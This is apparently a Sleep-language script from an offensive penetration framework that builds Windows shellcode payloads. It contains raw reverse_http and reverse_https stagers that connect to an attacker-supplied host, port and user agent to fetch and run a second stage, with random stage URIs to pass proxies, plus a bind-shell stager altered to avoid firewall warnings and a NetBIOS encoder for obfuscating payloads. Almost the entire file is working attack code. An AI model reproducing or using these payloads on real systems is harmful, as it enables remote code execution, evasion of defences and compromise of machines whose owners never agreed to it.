#
# custom shellcode
#

# generate a reverse_http stager that includes an embedded user-agent string. This will go through
# some proxies better.
# host, port, user-agent string
sub httpStager {
	local('$x $i $u @a');
	@a = split('', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz');
	shift(@a); # remove the "" option at the beginning
	$x = 
		"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" .
		"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" .
		"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" .
		"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" .
		"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" .
		"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" .
		"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" .
		"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" .
		"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" .
		"\x68\x6E\x65\x74\x00\x68\x77\x69\x6E\x69\x54\x68\x4C\x77\x26\x07" .
		"\xFF\xD5\xE8\x80\x00\x00\x00\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x00\x59\x31\xFF\x57\x57\x57\x57\x51\x68" .
		"\x3A\x56\x79\xA7\xFF\xD5\xEB\x79\x5B\x31\xC9\x51\x51\x6A\x03\x51" .
		"\x51\x68\x5C\x11\x00\x00\x53\x50\x68\x57\x89\x9F\xC6\xFF\xD5\xEB" .
		"\x62\x59\x31\xD2\x52\x68\x00\x02\x60\x84\x52\x52\x52\x51\x52\x50" .
		"\x68\xEB\x55\x2E\x3B\xFF\xD5\x89\xC6\x31\xFF\x57\x57\x57\x57\x56" .
		"\x68\x2D\x06\x18\x7B\xFF\xD5\x85\xC0\x74\x44\x31\xFF\x85\xF6\x74" .
		"\x04\x89\xF9\xEB\x09\x68\xAA\xC5\xE2\x5D\xFF\xD5\x89\xC1\x68\x45" .
		"\x21\x5E\x31\xFF\xD5\x31\xFF\x57\x6A\x07\x51\x56\x50\x68\xB7\x57" .
		"\xE0\x0B\xFF\xD5\xBF\x00\x2F\x00\x00\x39\xC7\x74\xBC\x31\xFF\xEB" .
		"\x15\xEB\x49\xE8\x99\xFF\xFF\xFF\x2F\x31\x32\x33\x34\x35\x00\x68" .
		"\xF0\xB5\xA2\x56\xFF\xD5\x6A\x40\x68\x00\x10\x00\x00\x68\x00\x00" .
		"\x40\x00\x57\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x53\x89\xE7\x57" .
		"\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xE2\xFF\xD5\x85\xC0" .
		"\x74\xCD\x8B\x07\x01\xC3\x85\xC0\x75\xE5\x58\xC3\xE8\x37\xFF\xFF" .
		"\xFF";

	# append our hostname
	$x = "$x $+ $1 $+ \x00";

	# replace our port [S- b/c we have to be little endian for some reason]
	$x = replaceAt($x, pack("S-", $2), 322, 2);

	# replace our useragent..
	$x = replaceAt($x, "$3 $+ \x00", indexOf($x, 'X' x 127));

	# fix our stage URI
	$i = indexOf($x, "/12345\x00");
	$u = "/" . rand(@a) . rand(@a) . rand(@a) . rand(@a) . "\x00";
	$x = replaceAt($x, $u, $i);

	return $x;
}

sub httpsStager {
	local('$x $i $u @a');
	@a = split('', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz');
	shift(@a); # remove the "" option at the beginning
	$x = 
		"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" .
		"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" .
		"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" .
		"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" .
		"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" .
		"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" .
		"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" .
		"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" .
		"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" .
		"\x68\x6E\x65\x74\x00\x68\x77\x69\x6E\x69\x54\x68\x4C\x77\x26\x07" .
		"\xFF\xD5\xE8\x80\x00\x00\x00\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" .
		"\x58\x58\x58\x58\x58\x58\x00\x59\x31\xFF\x57\x57\x57\x57\x51\x68" .
		"\x3A\x56\x79\xA7\xFF\xD5\xE9\x93\x00\x00\x00\x5B\x31\xC9\x51\x51" .
		"\x6A\x03\x51\x51\x68\x5C\x11\x00\x00\x53\x50\x68\x57\x89\x9F\xC6" .
		"\xFF\xD5\x89\xC3\xEB\x7A\x59\x31\xD2\x52\x68\x00\x32\xA0\x84\x52" .
		"\x52\x52\x51\x52\x50\x68\xEB\x55\x2E\x3B\xFF\xD5\x89\xC6\x68\x80" .
		"\x33\x00\x00\x89\xE0\x6A\x04\x50\x6A\x1F\x56\x68\x75\x46\x9E\x86" .
		"\xFF\xD5\x31\xFF\x57\x57\x57\x57\x56\x68\x2D\x06\x18\x7B\xFF\xD5" .
		"\x85\xC0\x74\x48\x31\xFF\x85\xF6\x74\x04\x89\xF9\xEB\x09\x68\xAA" .
		"\xC5\xE2\x5D\xFF\xD5\x89\xC1\x68\x45\x21\x5E\x31\xFF\xD5\x31\xFF" .
		"\x57\x6A\x07\x51\x56\x50\x68\xB7\x57\xE0\x0B\xFF\xD5\xBF\x00\x2F" .
		"\x00\x00\x39\xC7\x75\x04\x89\xD8\xEB\x8A\x31\xFF\xEB\x15\xEB\x49" .
		"\xE8\x81\xFF\xFF\xFF\x2F\x31\x32\x33\x34\x35\x00\x68\xF0\xB5\xA2" .
		"\x56\xFF\xD5\x6A\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57" .
		"\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x53\x89\xE7\x57\x68\x00\x20" .
		"\x00\x00\x53\x56\x68\x12\x96\x89\xE2\xFF\xD5\x85\xC0\x74\xCD\x8B" .
		"\x07\x01\xC3\x85\xC0\x75\xE5\x58\xC3\xE8\x1D\xFF\xFF\xFF";

	# append our hostname
	$x = "$x $+ $1 $+ \x00";

	# replace our port [S- b/c we have to be little endian for some reason]
	$x = replaceAt($x, pack("S-", $2), 325, 2);

	# replace our useragent..
	$x = replaceAt($x, "$3 $+ \x00", indexOf($x, 'X' x 127));

	# fix our stage URI
	$i = indexOf($x, "/12345\x00");
	$u = "/" . rand(@a) . rand(@a) . rand(@a) . rand(@a) . "\x00";
	$x = replaceAt($x, $u, $i);

	return $x;
}

# generate shellcode that listens on 127.0.0.1 to avoid firewall warnings
sub generateBindShellcode {
	# cd /opt/metasploit/msf3/external/source/shellcode/windows/x86
	# python build.py stager_bind_tcp_nx
	# LPORT is at position 204.
	# modified stager to bind to 127.0.0.1 instead of 0.0.0.0:
	#
	# -  push ebx               ; bind to 0.0.0.0
	# +  push 0x0100007f       ; bind to 127.0.0.1

	local('$x');
	$x = "\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" .
		"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" .
		"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" .
		"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" .
		"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" .
		"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" .
		"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" .
		"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" .
		"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" .
		"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07" .
		"\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00" .
		"\xFF\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF" .
		"\xD5\x97\x31\xDB\x68\x7F\x00\x00\x01\x68\x02\x00\x11\x5C\x89\xE6" .
		"\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x53\x57\x68\xB7\xE9" .
		"\x38\xFF\xFF\xD5\x53\x53\x57\x68\x74\xEC\x3B\xE1\xFF\xD5\x57\x97" .
		"\x68\x75\x6E\x4D\x61\xFF\xD5\x6A\x00\x6A\x04\x56\x57\x68\x02\xD9" .
		"\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A\x00" .
		"\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68\x02" .
		"\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3";
	return replaceAt($x, pack("S", $1), 204, 2);
}

# encode a file or stage with the netbios encoder.
sub netbiosEncoder {
	# stub to netbios decode what comes after it.
	local('$x');
	$x = 
		"\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" .
		"\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58" .
		"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42" .
		"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
		"\x42\x75\x4a\x49\x49\x6c\x6a\x48\x73\x30\x77\x70" .
		"\x77\x70\x75\x50\x6a\x4b\x30\x4e\x61\x4d\x6c\x4b" .
		"\x31\x55\x65\x50\x4c\x79\x63\x57\x72\x4f\x55\x37" .
		"\x32\x4f\x4e\x63\x79\x55\x76\x61\x34\x79\x68\x48" .
		"\x64\x35\x69\x61\x4c\x43\x4b\x75\x57\x73\x61\x45" .
		"\x36\x51\x7a\x56\x50\x31\x69\x6f\x54\x71\x4b\x6b" .
		"\x43\x56\x6e\x6b\x43\x6c\x64\x75\x55\x50\x4e\x59" .
		"\x35\x31\x55\x31\x67\x70\x55\x50\x35\x69\x38\x4b" .
		"\x62\x54\x56\x43\x54\x71\x39\x50\x65\x61\x6b\x62" .
		"\x4c\x48\x68\x5a\x6b\x30\x58\x6a\x42\x61\x4b\x39" .
		"\x7a\x70\x69\x51\x39\x70\x37\x74\x34\x71\x49\x42" .
		"\x6b\x38\x49\x6a\x4b\x30\x5a\x4a\x57\x31\x37\x71" .
		"\x38\x50\x6e\x68\x61\x54\x45\x6d\x63\x30\x6f\x73" .
		"\x39\x57\x45\x51\x6f\x73\x49\x56\x66\x62\x68\x6b" .
		"\x68\x4d\x36\x38\x69\x6f\x59\x70\x38\x68\x6e\x4d" .
		"\x79\x6f\x59\x6f\x49\x6f\x41\x41";

	# this is the whole encoding process. Pretty scary, right? Hah.
	return "$x $+ gogo" . [msf.NetBIOS encode: 'A', cast($1, 'b')] . "aa";
}
